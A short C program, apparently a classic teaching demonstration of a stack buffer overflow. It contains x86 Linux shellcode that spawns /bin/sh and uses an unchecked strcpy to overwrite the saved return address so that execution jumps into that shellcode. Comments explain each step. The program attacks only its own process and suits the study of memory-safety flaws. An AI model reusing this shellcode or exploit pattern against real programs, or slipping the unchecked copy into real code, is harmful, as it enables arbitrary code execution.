char shellcode[] =
  "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
  "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
  "\x80\xe8\xdc\xff\xff\xff/bin/sh";

char large_string[128];

void main() {
  char buffer[96];
  int i;
  long* long_ptr = (long *) large_string;
  
  // Fill array of large_string with the 
  // address of buffer, which is where our
  // code will be
  for(i = 0; i < 32; i++)
    *(long_ptr + i) = (int) buffer;
  
  // We then copy our shellcode to the beginning
  // of large_string
  for(i = 0; i < strlen(shellcode); i++)
    large_string[i] = shellcode[i];
  
  // We then copy large_string into buffer
  // without doing any bounds checking, overwriting
  // the return address to where our code is now
  // located
  strcpy(buffer, large_string);
}
